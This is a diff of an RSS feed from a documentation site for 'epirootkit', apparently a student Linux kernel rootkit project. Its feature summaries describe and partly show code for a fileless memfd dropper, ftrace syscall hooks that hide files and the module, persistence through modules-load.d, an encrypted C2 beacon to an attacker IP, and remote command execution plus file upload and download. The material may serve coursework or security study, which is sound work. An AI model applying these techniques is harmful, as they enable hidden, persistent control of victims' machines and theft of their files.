@@ -1,10 +1,301 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/04-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 11 May 2025 16:54:28 +0200</lastBuildDate><atom:link href="/docs/04-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Connection</title><link>/docs/04-epirootkit/features/connection/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/connection/</guid><description>&lt;p>Details about the connection mechanism (how it connects back, retries).&lt;/p></description></item><item><title>Persistence</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;p>How the rootkit achieves persistence across reboots.&lt;/p></description></item><item><title>Password Protection</title><link>/docs/04-epirootkit/features/password/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/password/</guid><description>&lt;p>How access to the rootkit is secured.&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;p>How commands are executed on the victim and results returned.&lt;/p></description></item><item><title>File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;p>Details on the upload and download functionality.&lt;/p></description></item><item><title>Hiding (Cardboard Box)</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Our rootkit must be invisible to standard user-land tools. We achieve this by hooking key syscalls and filtering out any trace of:&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/04-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 11 May 2025 20:22:17 +0200</lastBuildDate><atom:link href="/docs/04-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Connection</title><link>/docs/04-epirootkit/features/connection/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/connection/</guid><description>&lt;p>Details about the connection mechanism (how it connects back, retries).&lt;/p></description></item><item><title>Password Protection</title><link>/docs/04-epirootkit/features/password/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/password/</guid><description>&lt;p>How access to the rootkit is secured.&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;p>How commands are executed on the victim and results returned.&lt;/p></description></item><item><title>Crypto</title><link>/docs/04-epirootkit/features/crypto/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/crypto/</guid><description>&lt;p>Details on the encryption used for communication.&lt;/p></description></item><item><title>Bonus Features</title><link>/docs/04-epirootkit/features/bonus-features/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/bonus-features/</guid><description>&lt;p>Description of any extra implemented features (upgrade, packet hiding, keylogging, etc.).&lt;/p></description></item><item><title>Fileless Dropper &amp; Rootkit Loader</title><link>/docs/04-epirootkit/features/fileless-dropper-loader/</link><pubDate>Sun, 11 May 2025 18:15:00 +0100</pubDate><guid>/docs/04-epirootkit/features/fileless-dropper-loader/</guid><description>&lt;h1 id="stage-1-fileless-memfd-dropper">Stage 1: Fileless Memfd Dropper &lt;a href="#stage-1-fileless-memfd-dropper" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>
+&lt;div class="alert alert-info d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ ⚙️
+ &lt;/div>
+ 
+ &lt;div class="w-100">We stage both loader and cron stub entirely in memory&amp;ndash;no on-disk binaries.&lt;/div>
+ &lt;/div>
+&lt;ol>
+&lt;li>We call
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="8c2bc79" class="language-c ">
+ &lt;code>fd_loader = memfd_create(&amp;#34;loader&amp;#34;, MFD_CLOEXEC);
+fd_target = memfd_create(&amp;#34;target&amp;#34;, MFD_CLOEXEC);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+to get two anonymous file descriptors.&lt;/li>
+&lt;li>We &lt;code>write()&lt;/code> our embedded ELF blobs into each fd.&lt;/li>
+&lt;li>We &lt;code>fork()&lt;/code>:
 &lt;ul>
-&lt;li>attacker files/directories with the prefix &lt;code>jules_est_bo_&lt;/code>&lt;/li>
-&lt;li>in-memory file descriptors (&lt;code>memfd:*&lt;/code>)&lt;/li>
-&lt;li>the kernel module itself&lt;/li>
-&lt;li>hidden kernel threads / PIDs&lt;/li>
+&lt;li>&lt;strong>Child&lt;/strong>: redirect stdout/stderr to &lt;code>/dev/null&lt;/code>, then
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="0edd0ef" class="language-c ">
+ &lt;code>execveat(fd_loader, NULL, argv_loader, envp, AT_EMPTY_PATH);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>&lt;strong>Parent&lt;/strong>: &lt;code>waitpid()&lt;/code>, then
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="169713e" class="language-c ">
+ &lt;code>execveat(fd_target, NULL, argv_target, envp, AT_EMPTY_PATH);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
 &lt;/ul>
-&lt;p>All hooks are installed via the ftrace framework and removed cleanly at unload.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>execveat(..., AT_EMPTY_PATH)&lt;/code> lets us execute a program by FD without any filename on disk.&lt;/p></description></item><item><title>Symbol Resolution &amp; Ftrace Hooks</title><link>/docs/04-epirootkit/features/symbol-ftrace/</link><pubDate>Sun, 11 May 2025 18:20:00 +0100</pubDate><guid>/docs/04-epirootkit/features/symbol-ftrace/</guid><description>&lt;h1 id="symbol-resolution">Symbol Resolution &lt;a href="#symbol-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;ol>
+&lt;li>We spoof a GPL license so the kernel exports &lt;code>kallsyms_lookup_name()&lt;/code>:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="301615e" class="language-c ">
+ &lt;code>MODULE_LICENSE(&amp;#34;GPL&amp;#34;);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>At init, we call:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="20e28ad" class="language-c ">
+ &lt;code>sys_call_table = (void **)kallsyms_lookup_name(&amp;#34;sys_call_table&amp;#34;);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+This gives us the address of the syscall table.&lt;/li>
+&lt;/ol>
 &lt;hr>
-&lt;h2 id="1-file--directory-hiding">1. File &amp;amp; Directory Hiding &lt;a href="#1-file--directory-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="11-purpose">1.1 Purpose &lt;a href="#11-purpose" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Prevent any process from seeing files or directories created by the rootkit (e.g. under &lt;code>/usr/share/zov_f/&lt;/code> or with prefix &lt;code>jules_est_bo_&lt;/code>).&lt;/p></description></item><item><title>Crypto</title><link>/docs/04-epirootkit/features/crypto/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/crypto/</guid><description>&lt;p>Details on the encryption used for communication.&lt;/p></description></item><item><title>Bonus Features</title><link>/docs/04-epirootkit/features/bonus-features/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/bonus-features/</guid><description>&lt;p>Description of any extra implemented features (upgrade, packet hiding, keylogging, etc.).&lt;/p></description></item></channel></rss>
+&lt;h1 id="ftrace-based-hooking">Ftrace-Based Hooking &lt;a href="#ftrace-based-hooking" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>
+&lt;div class="alert alert-info d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ 🔧
+ &lt;/div>
+ 
+ &lt;div class="w-100">We use ftrace to hook without writing to kernel memory directly.&lt;/div>
+ &lt;/div>
+&lt;p>For each target syscall:&lt;/p>
+&lt;ol>
+&lt;li>Define an &lt;code>ftrace_ops&lt;/code> with flags:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="f3796aa" class="language-c ">
+ &lt;code>.func = hook_trampoline,
+.flags = FTRACE_OPS_FL_SAVE_REGS |
+ FTRACE_OPS_FL_IPMODIFY&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>Apply the filter:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="c83d517" class="language-c ">
+ &lt;code>ftrace_set_filter_ip(&amp;amp;ops, (unsigned long)orig_syscall, 0, 0);
+register_ftrace_function(&amp;amp;ops);&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>Our trampoline copies registers, calls &lt;code>hook_fn()&lt;/code>, then jumps back to the original.&lt;/li>
+&lt;/ol>
+&lt;p>Always unregister your ftrace functions in &lt;code>cleanup_module()&lt;/code>:&lt;/p></description></item><item><title>Stealth Hooks &amp; daniel.* Commands</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 11 May 2025 18:25:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h1 id="1-file--directory-hiding">1. File &amp;amp; Directory Hiding &lt;a href="#1-file--directory-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+We hook &lt;code>getdents()&lt;/code>/&lt;code>getdents64()&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Call the original syscall to fill a &lt;code>dirent&lt;/code> buffer.&lt;/li>
+&lt;li>Traverse entries; if &lt;code>d_name&lt;/code> starts with any prefix in
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="6c2d135" class="language-c ">
+ &lt;code>hide_prefixes[] = { &amp;#34;jules_est_bo_&amp;#34;, &amp;#34;memfd:&amp;#34; };&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+we drop that entry by &lt;code>memmove()&lt;/code>.&lt;/li>
+&lt;li>Return the new byte count.&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="2-module-hiding">2. Module Hiding &lt;a href="#2-module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+We hide our LKM from &lt;code>/proc/modules&lt;/code> and &lt;code>lsmod&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;br>
+We hook the procfs &lt;code>iterate&lt;/code> method for &lt;code>/proc/modules&lt;/code> and &lt;code>/sys/modules&lt;/code>, filtering out &lt;code>&amp;quot;epirootkit&amp;quot;&lt;/code> entries.&lt;/p></description></item><item><title>Encrypted C2, Persistence &amp; Auth</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 11 May 2025 18:30:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h1 id="1-encrypted-c2-heartbeat">1. Encrypted C2 Heartbeat &lt;a href="#1-encrypted-c2-heartbeat" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Spawn a kernel thread to poll our C2 server.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>kthread_run(c2_thread_fn, &amp;amp;cfg, &amp;quot;epic2&amp;quot;)&lt;/code>.&lt;/li>
+&lt;li>Loop:
+&lt;ul>
+&lt;li>&lt;code>msleep(ping_interval_ms)&lt;/code>.&lt;/li>
+&lt;li>&lt;code>kernel_socket()&lt;/code>, &lt;code>kernel_connect(attacker_ip, port)&lt;/code>.&lt;/li>
+&lt;li>Exchange AES-128-CBC packets using keys from &lt;code>.epirootkit-config&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="2-persistence--autoload">2. Persistence &amp;amp; Autoload &lt;a href="#2-persistence--autoload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Automatically load on reboot.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;br>
+Our &lt;code>installer.sh&lt;/code>:&lt;/p>
+&lt;ol>
+&lt;li>Copies &lt;code>epirootkit.ko&lt;/code> to &lt;code>/lib/modules/$(uname -r)/extra/&lt;/code>.&lt;/li>
+&lt;li>Runs &lt;code>depmod -a&lt;/code>.&lt;/li>
+&lt;li>Writes &lt;code>/etc/modules-load.d/epirootkit.conf&lt;/code> with:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="3079c8b" class="language- ">
+ &lt;code>epirootkit&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="3-password-protection">3. Password Protection &lt;a href="#3-password-protection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Protect &lt;code>daniel.*&lt;/code> commands with a salted hash.&lt;/p></description></item><item><title>Remote Exec &amp; File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 11 May 2025 18:35:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="1-remote-command-execution">1. Remote Command Execution &lt;a href="#1-remote-command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Allow arbitrary program execution via C2.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Receive a packet:
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="265fa6f" class="language- ">
+ &lt;code>EXEC &amp;lt;len&amp;gt;\n&amp;lt;payload&amp;gt;&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;/li>
+&lt;li>Use &lt;code>call_usermodehelper(argv, envp, UMH_WAIT_PROC)&lt;/code> to spawn the process.&lt;/li>
+&lt;li>Capture its &lt;code>stdout&lt;/code>/&lt;code>stderr&lt;/code> via kernel pipes and send back encrypted.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h1 id="2-file-upload">2. File Upload &lt;a href="#2-file-upload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Accept files from the attacker.&lt;/p>
+&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Receive &lt;code>UPLOAD &amp;lt;path&amp;gt; &amp;lt;len&amp;gt;\n&amp;lt;data&amp;gt;&lt;/code>.&lt;/li>
+&lt;li>&lt;code>filp_open(&amp;quot;/usr/share/epirootkit/&amp;lt;path&amp;gt;&amp;quot;, O_CREAT|O_WRONLY, 0600)&lt;/code>.&lt;/li>
+&lt;li>&lt;code>kernel_write()&lt;/code> the data.&lt;/li>
+&lt;li>Our &lt;code>getdents()&lt;/code> hook keeps &lt;code>/usr/share/epirootkit&lt;/code> hidden.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h1 id="3-file-download">3. File Download &lt;a href="#3-file-download" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+Send files to the attacker.&lt;/p></description></item></channel></rss>
